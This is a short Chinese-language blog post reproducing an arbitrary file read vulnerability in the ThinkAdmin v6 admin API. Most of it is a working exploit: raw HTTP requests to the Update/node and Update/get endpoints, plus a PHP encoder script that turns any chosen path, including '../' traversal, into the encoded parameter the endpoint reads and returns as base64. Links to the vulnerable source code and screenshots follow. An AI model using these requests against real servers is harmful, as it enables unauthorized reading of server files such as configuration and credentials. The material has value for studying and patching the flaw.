---
categories:
    - 漏洞复现
tags:
    - 漏洞复现
    - Thinkadmin
---
## Thinkadmin 任意文件读取复现

```
POST /admin.html?s=admin/api.Update/node HTTP/1.1
Host: xxx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 12
Connection: close
Referer: http://xxx/admin.html?s=admin/api.Update/node
Cookie: PHPSESSID=bcfcc345c9a2ffbd53edad34794d0c71
Upgrade-Insecure-Requests: 1

rules=["./"]
```

![image](https://raw.githubusercontent.com/saf3d0s/saf3d0s.github.io/master/images/2020-9-18/001.png)

主要读取文件url:是经过函数加密的

```
GET /admin.html?s=admin/api.Update/get/encode/1b34392q302x2r1b2x322s2t3c1a342w34 HTTP/1.1
Host: xxx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://xx/admin.html?s=admin/api.Update/node
Cookie: PHPSESSID=bcfcc345c9a2ffbd53edad34794d0c71
Upgrade-Insecure-Requests: 1


```
![image](https://raw.githubusercontent.com/saf3d0s/saf3d0s.github.io/master/images/2020-9-18/002.png)

![image](https://raw.githubusercontent.com/saf3d0s/saf3d0s.github.io/master/images/2020-9-18/003.png)

文件名加解密函数如下，可以将想读取的文件经过encode函数加密后进行读取，读取内容是base64加密的：  
需要注意读取文件要加上`/public/`,同时可以通过`../`跨目录读取

```
<?php

function encode($content)
    {
		$length = strlen($string = iconv('UTF-8', 'GBK//TRANSLIT', $content));
        $chars ='';
        for ($i = 0; $i < $length; $i++) $chars .= str_pad(base_convert(ord($string[$i]), 10, 36), 2, 0, 0);
        return $chars;
    };
echo encode("/public/index.php")."<br>";

function decode($content)
    {
        $chars = '';
        foreach (str_split($content, 2) as $char) {
            $chars .= chr(intval(base_convert($char, 36, 10)));
        }
        return iconv('GBK//TRANSLIT', 'UTF-8', $chars);
    };
echo decode("1b34392q302x2r1b2x322s2t3c1a342w34");
?>
```
![image](https://raw.githubusercontent.com/saf3d0s/saf3d0s.github.io/master/images/2020-9-18/004.png)


github 源文件地址：

```
https://github.com/zoujingli/ThinkAdmin/blob/v6/app/admin/controller/api/Update.php
```

![image](https://raw.githubusercontent.com/saf3d0s/saf3d0s.github.io/master/images/2020-9-18/005.png)

![image](https://raw.githubusercontent.com/saf3d0s/saf3d0s.github.io/master/images/2020-9-18/006.png)

```
https://github.com/zoujingli/ThinkAdmin/blob/05711afcdcd0c87fcbf65a614281941a457b0863/vendor/zoujingli/think-library/src/common.php#L163
```

![image](https://raw.githubusercontent.com/saf3d0s/saf3d0s.github.io/master/images/2020-9-18/007.png)